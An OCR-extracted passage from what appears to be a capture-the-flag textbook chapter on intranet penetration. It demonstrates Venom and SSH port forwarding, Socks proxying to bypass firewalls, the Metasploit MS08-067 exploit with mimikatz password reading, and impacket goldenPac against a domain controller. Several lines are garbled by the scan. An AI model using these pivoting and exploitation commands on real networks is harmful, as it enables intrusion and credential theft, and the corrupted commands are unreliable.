The other is set with a single network card named VMnet, as shown in Fig. 12.26.
Then turn off the firewalls for both Windows machines.
At this point, the basic environment setup is complete, and the above environment 
will be used later for experiments.
12.2.1Port Forwarding
In penetration competitions, the network environment is often more complex, and in
order to be able to operate smoothly in any scenario, competitors need to be
proficient in the art of port forwarding. As the name implies, port forwarding

means forwarding ports as wishes. Only through port forwarding can make hosts that
are not directly accessible after multi-level routing accessible.
There are many kinds of tools that can perform port forwarding, such as SSH,
Lcx, Netsh, Socat, Earthworm, Frp, Ngrok, Termite, Venom, etc. Among them,
Earthworm, Termite, Venom are the same kind of tools, which are characterized by
3q ueo qpqm “uuoed-ssous Suoddns pue Aem [epou r u sisoq apdnu ujgeueu
used to build a proxy chain as quick as possible. If used skillfully in the penetration,
they can be a great time saver. However, for some reason, their authors have
removed both tools from the shelves and cannot download them from official
sources.
Here we focus on Venom and SSH.
1. Venom

testers to connect multiple nodes and then uses the nodes as a jump box to build
multi-level proxies. Penetration testers can easily use Venom to proxy network 
traffic to multi-layered intranets and easily manage proxy nodes.
Venom is divided into two parts: admin and agent, the core operation of them is to
listen and connect. Both admin and agent nodes can listen or initiate connections.
(Quoted from the official Github repository description at https://github.com/Dliv3/
Venom.)
Examples of commands are shown below.
(1) Using admin as a server
# The admin 1istens on local port 9999
. /admin_macos_x64 -1port 9999
# node connect to the admin node vith given IP address and port
. /agent_1inux_x64 -rhost 192.168.0.103 -zport 9999
(2) Using the node as a server
# Node 1istening on local port 9999
 /agent_1inux_x64 -1port 8888
# node connect to another node with given IP address and port
./agent_11nux_x64 -rhost 192.168.0.103 -xport 9999
Once the node is acquired, you can use the goto command to enter the node and
perform the following operations on the node.
• Listen, listening for ports on the target node.
* Connect, which allows the target node to connect to a given service.
Sshconnect, which establishes the SSH proxy service.
• Shell, which starts an interactive shell.
• Upload, upload files; Download, download files.

The next step is to use the simulated environment for the actual operation. First,

Suppose you have successfully taken down the first machine, upload the com-
piled file to the target host, and then start the server. If the target does not have a
public network address or a firewall exists, so you cannot access the target port
directly, and you need to establish a reverse connection, that is to use admin client to
listens on the port as a server to be connected, and the agent node makes an active
connection to the server. In this way, we can bypass the restriction of any existing
firewalls. And the command needed is as follows.
Enable listening on port 8888 on the server, see Fig. 12.27.
./admin_1inux_x64 -1port 8888
Next, run the agent on the jumobox to connect to the server side, see Fig. 12.28.
agent.exe -rhost 192. 168.40.145 -rport 8888
On the admin side you can see that the connection is established, enter the added
node, and list the commands available, see Fig. 12.29.
The following section explains the use of port forwarding, where there are two
port forwarding functions: local port forwarding and remote port forwarding.

Local port forwarding is the forwarding of a local (admin node) port to a port on
the target node. For example, to forward a web service on local port 80 to port 80 of
the target node, the command would be.
1forward 127.0 . 0 .1 80 80
The web service can then be accessed on port 80 of the target node, see
Fig. 12.30.
Remote port forwarding is the forwarding of a port from a remote node to a local
port. For example, port 80, which was previous opened on the target node, is then
forwarded to port 8080 of the admin node with the command.

Accessing the local port 8080 will give you access to port 80 of the target node,
see Fig. 12.31.
Of course, it is also possible to forward ports from other machines on the intranet,
such as 192.168.115.129, which cannot be accessed directly. But now we can
forward its smb port to the local 445 port with the following command.
rforward 192.168 . 115 .129 445 445

The smb service from 192.168.115.129 can then be accessed on the local port
445, as shown in Fig. 12.32.
2. SSH
Port forwarding in SSH is very convenient and stable in some scenarios. The specific
operation method is as follows. Readers can test locally by themselves.
(1) Local Forwarding. Local access to 127.0.0.1:port1 is host:port2, which is.
ssh -CfNg -L port1:127.0.0.1 :port2 user8host
(2) Remote forwarding. Accessing host:port2 is accessing 127.0.0.1:port1, which is.

12.2.2 Socks Proxy
Socks is a proxy service that connects two end systems and the proxy defaultly
listening on port 1080 supports a variety of protocols, including HTTP, HTTPS,
SSH and other types of requests. Socks is divided into Socks4 and Socks5, Socks4
only supports TCP, while Socks5 supports TCP/UDP and various authentication
protocols.

access various service resources on the target intranet more quickly and easily than
port forwarding.
1. Use SSH as a Socks proxy
The following 1.1.1.1 are all assumed to be the IP of the personal server. running
locally.
ssh -qTfnN -D 1080 root@1 .1.1.1
Eventually, port 1080 will be opened locally on 127.0.0.1, and then the proxy
server 1.1.1.1 will be connected.
od HSS a pue pomssed HSS a o8 ues no  “Susa uogenuad o Suum
is open to the public, you can use the above command to easily perform the Socks
proxy. However, in many cases there is no way to connect directly to SSH, so the
following procedure can be followed.
(1) Modify the GatewayPorts in the /etc/ssh/sshd_config file to °yes” on your own
1001 jo pest o0ooo 1e sg  ss e  e os os
8080, so that you can access it on the public network.
(2) Execute the command °ssh -p 22 -qngfNTR 6666:localhost:22 root@ 1.1.1.1" on
the target machine to forward port 22 to 1.1.1.1:6666 on the target machine.
(3) Execute the command “ssh -p 6666 -qngfNTD 6767 root@ 1.1.1.1° on the
personal server 1.1.1.1 and make an SSH connection through port 6666 of
1.1.1.1, which is port 22 of the target, and finally map out port 6767.
(4)You can then use 1.1.1.1.1:6767 as a proxy to access the target network.
2. Venom as a Socks proxy.
Venom can also start up a Socks proxy server and the procedure is very simple since
we don't have to perform listen and forward on each host manually. Again, we need
to take control of the first machine, upload the agent program, and actively connect
to the server. After getting the node connected, use the “goto [node id]" command to
enter the node, and use the “socks 1080" command to open a local Socks5 service
port. The port proxy is the target node’s network, requests through the 1080 port,
will be forwarded through the target node, thus realizing the proxy function.

After enabling the port, you can use proxychains to proxy the command line
program. Here you need to configure the proxy port in the path /etc/proxychains.conf
and add the port address to the last line of the configuration file, see Fig. 12.33.
You can then access other hosts on the intranet through the Socks5 proxy, as
shown in Fig. 12.34.
Remember to turm off the Windows firewall if you cannot access other host
services.

ms08-067 is a very old vulnerability in which a buffer overflow exists in the
handling of specially crafted RPC requests by Windows Server services. A remote
attacker could trigger this vulnerability by sending a malicious RPC request,
resulting in a complete compromise of the user’s system and the execution of

dows Server 2003, this vulnerability can be exploited without authentication.
Firstly, use the smb_version module to determine the system version of the target,
see Fig. 12.35. If the version is Windows XP SP3, use the exploit/windows/smb/
ms08_067_netapi module to attempt an attack and configure the parameters. The
proxychains is used here to proxy Metasploit, so you need to use a payload with an
active TCP connection, see Fig. 12.36.
We can then use mimikatz to read the password, see Fig. 12.37.

Fig, 12.37 Use mimikatz to read the password
server restrict users’ access based on the privilege information in the PAC. The root
cause of the vulnerability is that KDC allows a user to forge a PAC and then use a
specified algorithm to encrypt and decrypt it, and send TGS-REQ requests with a
PAC that forged user with high privileges, thus the ticket returmed has high privi-
leges. The vulnerability affects the following versions: Windows Server 2003,
Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, Windows
Server 2012 R2.
Of course, there are prerequisites for this vulnerability: a valid domain user and
password, a sid for the domain user, a domain-controller’s address, and Windows
7 or higher. Note that the operating system requirement is Windows 7 or higher
because Windows XP does not support importing tickets, which can also be ignored
if the attacker relays on Linux machine.
Here is an example of goldenPac.py from the impacket package (htps:/github.
com/SecureAuthCorp/impacket), using the parameters shown in Fig. 12.38. Take
the competition I have participated in as an example; the command is as follows:
python go1denPac -py web. 1ctf . com/buguake :xdsec@1ctf2018esub-dc.veb.
1ctf .com -dc-ip 172.21.0.7
-target-1p 172.21.0.7 cnd
The final result of the implementation is similar to Fig. 12.39.
